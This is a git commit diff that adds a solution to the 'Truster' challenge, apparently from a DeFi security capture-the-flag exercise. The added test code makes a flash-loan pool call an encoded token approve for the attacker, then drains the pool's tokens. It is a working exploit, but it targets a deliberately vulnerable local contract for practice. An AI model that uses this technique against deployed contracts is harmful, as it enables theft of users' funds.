aa18ce14be96d2646c94d8525ddfec3093d7b01d
vishesh0123 <visheshsachdev04@gmail.com>
2022-07-24 12:32:28 +0530

    solved unstoppable and truster

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,46 +1,62 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
-    let deployer, attacker;
+describe("[Challenge] Truster", function () {
+  let deployer, attacker;
 
-    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
+  const iface = new ethers.utils.Interface([
+    "function approve(address,uint256)",
+  ]);
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, attacker] = await ethers.getSigners();
 
-        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+    const DamnValuableToken = await ethers.getContractFactory(
+      "DamnValuableToken",
+      deployer
+    );
+    const TrusterLenderPool = await ethers.getContractFactory(
+      "TrusterLenderPool",
+      deployer
+    );
 
-        this.token = await DamnValuableToken.deploy();
-        this.pool = await TrusterLenderPool.deploy(this.token.address);
+    this.token = await DamnValuableToken.deploy();
+    this.pool = await TrusterLenderPool.deploy(this.token.address);
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+    expect(await this.token.balanceOf(this.pool.address)).to.equal(
+      TOKENS_IN_POOL
+    );
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal('0');
-    });
+    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
+  });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
-    });
+  it("Exploit", async function () {
+    let balance = await this.token.balanceOf(this.pool.address);
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+    let data = iface.encodeFunctionData("approve", [
+      attacker.address,
+      balance.toString(),
+    ]);
+    await this.pool
+      .connect(attacker)
+      .flashLoan(0, attacker.address, this.token.address, data);
+    await this.token
+      .connect(attacker)
+      .transferFrom(this.pool.address, attacker.address, balance);
+    /** CODE YOUR EXPLOIT HERE  */
+  });
 
-        // Attacker has taken all tokens from the pool
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal('0');
-    });
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+
+    // Attacker has taken all tokens from the pool
+    expect(await this.token.balanceOf(attacker.address)).to.equal(
+      TOKENS_IN_POOL
+    );
+    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
+  });
 });
-
